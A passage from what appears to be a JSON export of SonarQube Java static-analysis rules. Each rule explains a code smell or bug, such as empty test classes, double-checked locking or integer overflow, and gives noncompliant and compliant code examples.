Similarly, you shouldnât have a file in the tests directory\nnamed <code>*Test</code>, <code>*Tests</code>, or <code>*TestCase</code>, but no tests in the file. Doing either of these things may lead someone to\nthink that uncovered classes have been tested.</p>\n<p>This rule raises an issue when files in the test directory are named <code>*Test</code>, <code>*Tests</code>, or <code>*TestCase</code> or\nimplement <code>TestCase</code> but donât contain any tests.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> TestNG </li>\n  <li> Zohhak </li>\n  <li> ArchUnit </li>\n  <li> Pact </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2187","summary":"TestCases should contain tests","tags":["junit","tests","unused","confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>JUnit assertions should not be made from the <code>run</code> method of a <code>Runnable</code>, because their failure may not be detected in the\ntest that initiated them. Failed assertions throw assertion errors. However, if the error is thrown from another thread than the one that initiated\nthe test, the thread will exit but the test will not fail.</p>\n<h2>How to fix it</h2>\n<p>Assertions in <code>Runnable</code> tasks should be extracted or executed by the main thread to make the whole test fail.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass RunnableWithAnAssertion extends Thread {\n  @Override\n  public void run() {\n    Assert.assertEquals(expected, actual);  // Noncompliant\n  }\n\n  @Test\n  void test() {\n    RunnableWithAnAssertion otherThread = new RunnableWithAnAssertion();\n    otherThread.start(); // The assertion in the run method above will be executed by other thread than the current one\n    // ...\n    // Perform some actions that do not make the test fail\n    // ...\n    Assert.assertTrue(true);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass RunnableWithAnAssertion extends Thread {\n  @Override\n  public void run() {\n    Assert.assertEquals(expected, actual);  // Noncompliant\n  }\n\n  @Test\n  void test() {\n    RunnableWithAnAssertion otherThread = new RunnableWithAnAssertion();\n    otherThread.run();\n    // ...\n    // The failed assertions in the run method will prevent us from reaching the assertion below\n    // ...\n    Assert.assertTrue(true);\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2186","summary":"JUnit assertions should not be used in \"run\" methods","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Some mathematical operations are unnecessary and should not be performed because their results are predictable.</p>\n<p>For instance, <code>anyValue % 1</code> will always return 0, as any integer value can be divided by 1 without remainder.</p>\n<p>Similarly, casting a non-floating-point to a floating-point value and then passing it to <code>Math.round</code>, <code>Math.ceil</code>, or\n<code>Math.floor</code> is also unnecessary, as the result will always be the original value.</p>\n<p>The following operations are unnecessary when given any constant value: <code>Math.abs</code>, <code>Math.ceil</code>, <code>Math.floor</code>,\n<code>Math.rint</code>, <code>Math.round</code>. Instead, use the result of the operation directly.</p>\n<p>The following operations are unnecessary with certain constants and can be replaced by the result of the operation directly:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Operation</th>\n      <th>Value</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>acos</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>asin</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>atan</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>atan2</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>cbrt</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>cos</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>cosh</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>exp</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>expm1</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>log</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>log10</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>sin</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>sinh</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>sqrt</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>tan</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>tanh</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n    <tr>\n      <td><p>toDegrees</p></td>\n      <td><p>0.0 or 1.0</p></td>\n    </tr>\n    <tr>\n      <td><p>toRadians</p></td>\n      <td><p>0.0</p></td>\n    </tr>\n  </tbody>\n</table>\n<h2>How to fix it</h2>\n<p>Ask yourself if the questionable operation represents the desired calculation or if a value used is erroneous. If the calculation is correct,\nreplace it with the result to avoid having to perform the unnecessary operation at runtime.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doMath(int a) {\n  double res1 = Math.floor((double)a); // Noncompliant, the result will always be equal to '(double) a'\n  double res2 = Math.ceil(4.2);        // Noncompliant, the result will always be 5.0\n  double res3 = Math.atan(0.0);        // Noncompliant, the result will always be 0.0\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doMath(int a) {\n  double res1 = a;    // Compliant\n  double res2 = 5.0;  // Compliant\n  double res3 = 0.0;  // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2185","summary":"Do not perform unnecessary mathematical operations","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When arithmetic is performed on integers, the result will always be an integer. You can assign that result to a <code>long</code>,\n<code>double</code>, or <code>float</code> with automatic type conversion, but having started as an <code>int</code> or <code>long</code>, the result\nwill likely not be what you expect.</p>\n<p>For instance, if the result of <code>int</code> division is assigned to a floating-point variable, precision will have been lost before the\nassignment. Likewise, if the result of multiplication is assigned to a <code>long</code>, it may have already overflowed before the assignment.</p>\n<p>In either case, the result will not be what was expected. Instead, at least one operand should be cast or promoted to the final type before the\noperation takes place.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfloat twoThirds = 2/3; // Noncompliant; int division. Yields 0.0\nlong millisInYear = 1_000*3_600*24*365; // Noncompliant; int multiplication. Yields 1471228928\nlong bigNum = Integer.MAX_VALUE + 2; // Noncompliant. Yields -2147483647\nlong bigNegNum =  Integer.MIN_VALUE-1; //Noncompliant, gives a positive result instead of a negative one.\nDate myDate = new Date(seconds * 1_000); //Noncompliant, won't produce the expected result if seconds &gt; 2_147_483\n...\npublic long compute(int factor){\n  return factor * 10_000;  //Noncompliant, won't produce the expected result if factor &gt; 214_748\n}\n\npublic float compute2(long factor){\n  return factor / 123;  //Noncompliant, will be rounded to closest long integer\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfloat twoThirds = 2f/3; // 2 promoted to float. Yields 0.6666667\nlong millisInYear = 1_000L*3_600*24*365; // 1000 promoted to long. Yields 31_536_000_000\nlong bigNum = Integer.MAX_VALUE + 2L; // 2 promoted to long. Yields 2_147_483_649\nlong bigNegNum =  Integer.MIN_VALUE-1L; // Yields -2_147_483_649\nDate myDate = new Date(seconds * 1_000L);\n...\npublic long compute(int factor){\n  return factor * 10_000L;\n}\n\npublic float compute2(long factor){\n  return factor / 123f;\n}\n</pre>\n<p>or</p>\n<pre>\nfloat twoThirds = (float)2/3; // 2 cast to float\nlong millisInYear = (long)1_000*3_600*24*365; // 1_000 cast to long\nlong bigNum = (long)Integer.MAX_VALUE + 2;\nlong bigNegNum =  (long)Integer.MIN_VALUE-1;\nDate myDate = new Date((long)seconds * 1_000);\n...\npublic long compute(long factor){\n  return factor * 10_000;\n}\n\npublic float compute2(float factor){\n  return factor / 123;\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/190\">CWE-190 - Integer Overflow or Wraparound</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/AjdGBQ\">CERT, NUM50-J.</a> - Convert integers to floating point for floating-point operations\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/I9cxBQ\">CERT, INT18-C.</a> - Evaluate integer expressions in a larger size before comparing or\n  assigning to that size </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222612\">Application Security and\n  Development: V-222612</a> - The application must not be vulnerable to overflow attacks. </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2184","summary":"Math operands should be cast before assignment","tags":["cwe","overflow","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Since an <code>int</code> is a 32-bit variable, shifting by more than +/-31 is confusing at best and an error at worst. When the runtime shifts\n32-bit integers, it uses the lowest 5 bits of the shift count operand. In other words, shifting an <code>int</code> by 32 is the same as shifting it\nby 0, and shifting it by 33 is the same as shifting it by 1.</p>\n<p>Similarly, when shifting 64-bit integers, the runtime uses the lowest 6 bits of the shift count operand and shifting <code>long</code> by 64 is the\nsame as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic int shift(int a) {\n  int x = a &gt;&gt; 32; // Noncompliant\n  return a &lt;&lt; 48;  // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic int shift(int a) {\n  int x = a &gt;&gt; 31;\n  return a &lt;&lt; 16;\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2183","summary":"Ints and longs should not be shifted by zero or more than their number of bits-1","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are\nevaluated under the wrong circumstances.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif(getTrue() | getFalse()) { ... } // Noncompliant; both sides evaluated\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif(getTrue() || getFalse()) { ... } // true short-circuit logic\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WNYxBQ\">CERT, EXP46-C.</a> - Do not use a bitwise operator with a Boolean-like operand </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2178","summary":"Short-circuit logic should be used in boolean contexts","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When a method in a child class has the same signature as a method in a parent class, it is assumed to be an override. However, thatâs not the case\nwhen:</p>\n<ul>\n  <li> the parent class method is <code>static</code> and the child class method is not. </li>\n  <li> the arguments or return types of the child method are in different packages than those of the parent method. </li>\n  <li> the parent class method is <code>private</code>. </li>\n</ul>\n<p>Typically, these things are done unintentionally; the private parent class method is overlooked, the <code>static</code> keyword in the parent\ndeclaration is overlooked, or the wrong class is imported in the child. But if the intent is truly for the child class method to be different, then\nthe method should be renamed to prevent confusion.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n// Parent.java\nimport computer.Pear;\npublic class Parent {\n\n  public void doSomething(Pear p) {\n    //,,,\n  }\n\n  public static void doSomethingElse() {\n    //...\n  }\n}\n\n// Child.java\nimport fruit.Pear;\npublic class Child extends Parent {\n\n  public void doSomething(Pear p) {  // Noncompliant; this is not an override\n    // ...\n  }\n\n\n  public void doSomethingElse() {  // Noncompliant; parent method is static\n    //...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n// Parent.java\nimport computer.Pear;\npublic class Parent {\n\n  public void doSomething(Pear p) {\n    //,,,\n  }\n\n  public static void doSomethingElse() {\n    //...\n  }\n}\n\n// Child.java\nimport computer.Pear;  // import corrected\npublic class Child extends Parent {\n\n  public void doSomething(Pear p) {  // true override (see import)\n    //,,,\n  }\n\n  public static void doSomethingElse() {\n    //...\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2177","summary":"Child class methods named for parent class methods should be overrides","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Two classes can have the same simple name if they are in two different packages.</p>\n<pre>\npackage org.foo.domain;\n\npublic class User {\n  // ..\n}\n</pre>\n<pre>\npackage org.foo.presentation;\n\npublic class User {\n  // ..\n}\n</pre>\n<p>However, this becomes an issue when a class has the same name as the superclass it extends or the interfaces it implements, also known as class\nname shadowing. It is problematic because it can be unclear which class is being referred to in the code, leading to ambiguity and potential bugs.</p>\n<p>Therefore, it is recommended to use unique and descriptive class names that do not conflict with the names of the superclass or interfaces.</p>\n<p>This rule raises an issue when a class name shadows its superclass or interface names.</p>\n<h2>How to fix it</h2>\n<p>Rename the class using a more descriptive name.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npackage org.foo.presentation;\n\npublic class User implements org.foo.domain.User { // Noncompliant\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npackage org.foo.presentation;\n\nimport org.foo.domain.User;\n\npublic class UserView implements User { // Compliant\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.4.1\">Java SE Specifications &gt; Java Language Specification &gt;\n  6.4.1. Shadowing</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2176","summary":"Class names should not shadow interfaces or superclasses","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>java.util.Collection</code> type and its subtypes provide methods to access and modify collections such as <code>Collection.remove(Object\no)</code> and <code>Collection.contains(Object o)</code>. Some of these methods accept arguments of type <code>java.lang.Object</code> and will\ncompare said argument with objects already in the collection.</p>\n<p>If the actual type of the argument is unrelated to the type of object contained in the collection, these methods will always return\n<code>false</code>, <code>null</code>, or <code>-1</code>. This behavior is most likely unintended and can be indicative of a design issue.</p>\n<p>This rule raises an issue when the type of the argument provided to one of the following methods is unrelated to the type used for the collection\ndeclaration:</p>\n<ul>\n  <li> <code>Collection.remove(Object o)</code> </li>\n  <li> <code>Collection.removeAll(Collection&lt;?&gt;)</code> </li>\n  <li> <code>Collection.contains(Object o)</code> </li>\n  <li> <code>List.indexOf(Object o)</code> </li>\n  <li> <code>List.lastIndexOf(Object o)</code> </li>\n  <li> <code>Map.containsKey(Object key)</code> </li>\n  <li> <code>Map.containsValue(Object value)</code> </li>\n  <li> <code>Map.get(Object key)</code> </li>\n  <li> <code>Map.getOrDefault(Object key, V defaultValue)</code> </li>\n  <li> <code>Map.remove(Object key)</code> </li>\n  <li> <code>Map.remove(Object key, Object value)</code> </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Ask yourself what the purpose of this method call is. Check whether the provided argument and collection are correct in this context and for the\ndesired purpose. Remove unnecessary calls and otherwise provide an argument of which the type is compatible with the list contentâs type.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid removeFromMap(Map&lt;Integer, Object&gt; map, String strKey) {\n  map.remove(strKey); // Noncompliant, this call will remove nothing and always return 'null' because 'map' is handling only Integer keys and String cannot be cast to Integer.\n}\n\nvoid listContains(List&lt;String&gt; list, Integer integer) {\n  if (list.contains(integer)) { // Noncompliant; always false as the list only contains Strings, not integers.\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid removeFromMap(Map&lt;Integer, Object&gt; map, String strKey) {\n  map.remove(Integer.parseInt(strKey)); // Compliant, strKey is parsed into an Integer before trying to remove it from the map.\n}\n\nvoid listContains(List&lt;String&gt; list, Integer integer) {\n  if (list.contains(integer.toString())) { // Compliant, 'integer' is converted to a String before checking if the list contains it.\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/uDdGBQ\">CERT, EXP04-J.</a> - Do not pass arguments to certain Java Collections Framework methods\n  that are a different type than the collection parameter type </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/Collection.html\">Java SE 17 &amp; JDK 17</a> - Collection\n  interface </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2175","summary":"Inappropriate \"Collection\" calls should not be made","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Double-checked locking is the practice of checking a lazy-initialized objectâs state both before and after a <code>synchronized</code> block is\nentered to determine whether to initialize the object. In early JVM versions, synchronizing entire methods was not performant, which sometimes caused\nthis practice to be used in its place.</p>\n<p>Apart from <code>float</code> and <code>int</code> types, this practice does not work reliably in a platform-independent manner without additional\nsynchronization of mutable instances. Using double-checked locking for the lazy initialization of any other type of primitive or mutable object risks\na second thread using an uninitialized or partially initialized member while the first thread is still creating it. The results can be unexpected,\npotentially even causing the application to crash.</p>\n<h2>How to fix it</h2>\n<p>Given significant performance improvements of <code>synchronized</code> methods in recent JVM versions, <code>synchronized</code> methods are now\npreferred over the less robust double-checked locking.</p>\n<p>If marking the entire method as <code>synchronized</code> is not an option, consider using an inner <code>static class</code> to hold the reference\ninstead. Inner static classes are guaranteed to be initialized lazily.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ResourceFactory {\n    private static Resource resource;\n\n    public static Resource getInstance() {\n        if (resource == null) {\n            synchronized (DoubleCheckedLocking.class) { // Noncompliant, not thread-safe due to the use of double-checked locking.\n                if (resource == null)\n                    resource = new Resource();\n            }\n        }\n        return resource;\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ResourceFactory {\n    private static Resource resource;\n\n    public static synchronized Resource getInstance() { // Compliant, the entire method is synchronized and hence thread-safe\n        if (resource == null)\n            resource = new Resource();\n        return resource;\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>Alternatively, a static inner class can be used. However, this solution is less explicit in its intention and hence should be used with care.</p>\n<pre>\npublic class ResourceFactory {\n    private static class ResourceHolder {\n        public static Resource resource = new Resource(); // Compliant, as this will be lazily initialised by the JVM\n    }\n\n    public static Resource getResource() {\n        return ResourceFactory.ResourceHolder.resource;\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html\">The \"Double-Checked Locking is Broken\" Declaration</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6zdGBQ\">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/609\">CWE-609 - Double-checked locking</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se7/html/jls-12.html#jls-12.4\">JLS 12.4</a> - Initialization of Classes and Interfaces </li>\n  <li> Wikipedia: <a href=\"https://en.wikipedia.org/wiki/Double-checked_locking#Usage_in_Java\">Double-checked locking</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2168","summary":"Double-checked locking should not be used","tags":["cert","cwe","design","multi-threading","singleton"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Comparable.compareTo</code> method returns a negative integer, zero, or a positive integer to indicate whether the object is less than,\nequal to, or greater than the parameter. The sign of the return value or whether it is zero is what matters, not its magnitude.</p>\n<p>Returning a positive or negative constant value other than the basic ones (-1, 0, or 1) provides no additional information to the caller. Moreover,\nit could potentially confuse code readers who are trying to understand its purpose.</p>\n<h2>How to fix it</h2>\n<p>Replace any positive constant return value with 1. Replace any negative constant return value with -1.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic int compareTo(Name name) {\n  if (condition) {\n    return Integer.MIN_VALUE; // Noncompliant\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic int compareTo(Name name) {\n  if (condition) {\n    return -1; // Compliant\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic int compareTo(Name name) {\n  if (condition) {\n    return 42; // Noncompliant\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic int compareTo(Name name) {\n  if (condition) {\n    return 1; // Compliant\n  }\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>It is compliant to return other values than -1, 0 or 1 if they are not constants.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\npublic int compareTo(Name name) {\n  if (condition) {\n    return 42; // Noncompliant\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\npublic int compareTo(Name name) {\n  if (condition) {\n    return hashCode() - name.hashCode(); // Compliant, not a constant\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html#compareTo-T-\">Java SE 8 API Specification:\n  Comparable.compareTo</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Integer.html#MIN_VALUE\">Java SE 8 API Specification: Integer.MIN_VALUE</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2167","summary":"\"compareTo\" should not return \"Integer.MIN_VALUE\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code.\nUsing \"exception\" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation\nthat a class' name will indicate what it is and/or does.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class FruitException {  // Noncompliant; this has nothing to do with Exception\n  private Fruit expected;\n  private String unusualCharacteristics;\n  private boolean appropriateForCommercialExploitation;\n  // ...\n}\n\npublic class CarException {  // Noncompliant; the extends clause was forgotten?\n  public CarException(String message, Throwable cause) {\n  // ...\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class FruitSport {\n  private Fruit expected;\n  private String unusualCharacteristics;\n  private boolean appropriateForCommercialExploitation;\n  // ...\n}\n\npublic class CarException extends Exception {\n  public CarException(String message, Throwable cause) {\n  // ...\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2166","summary":"Classes named like \"Exception\" should extend \"Exception\" or a subclass","tags":["convention","error-handling","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>This rule raises an issue when a finalizer assign <code>null</code> to fields of the instance it is called on.</p>\n<h2>Why is this an issue?</h2>\n<p>In the Java object lifecycle, the <code>finalize</code> method for an instance is called after the garbage collector has determined that the\ninstance can be removed from the object heap. Therefore, it is unnecessary to implement a finalizer to set instance fields explicitly to\n<code>null</code> to tell the garbage collector that the instance no longer needs them.</p>\n<p>In the worst case, implementing <code>finalize</code> is even counterproductive because it might accidentally create new references from other\n(living) objects on the heap to the collectible instance, thus, reviving it.</p>\n<p><strong>Important note about finalizers:</strong></p>\n<p>There are no guarantees when the Java Runtime will call the <code>finalize</code> method or whether it will be called at all.</p>\n<p>Using finalizers is, therefore, a bad practice. They should never be used to free resources, such as closing streams, freeing locks, or freeing\nnative system resources. Consider other freeing mechanisms instead, such as an explicit <code>close</code>, <code>unlock</code>, or <code>free</code>\nmethod in your class.</p>\n<h2>How to fix it</h2>\n<p>Remove assignments from your finalizer that assign <code>null</code> to fields of the instance the finalizer is called on. When this leaves you\nwith an empty finalizer body, remove the finalizer.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Foo {\n  private String name;\n\n  @Override\n  void finalize() {\n    name = null;  // Noncompliant, instance will be removed anyway\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Foo { // Compliant\n  private String name;\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#finalize--\">Java SE 8 API Specification - Object.finalize</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://howtodoinjava.com/java/basics/why-not-to-use-finalize-method-in-java\">Java finalize() â Why We Should Not Use It? - Lokesh\n  Gupta</a> </li>\n  <li> <a href=\"https://www.baeldung.com/java-finalize\">A Guide to the finalize Method in Java - Baeldung</a> </li>\n</ul>\n\n","impacts":[],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2165","summary":"\"finalize\" should not set fields to \"null\"","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>For small numbers, <code>float</code> math has enough precision to yield the expected value, but for larger numbers, it does not.\n<code>BigDecimal</code> is the best alternative, but if a primitive is required, use a <code>double</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfloat a = 16777216.0f;\nfloat b = 1.0f;\nfloat c = a + b; // Noncompliant; yields 1.6777216E7 not 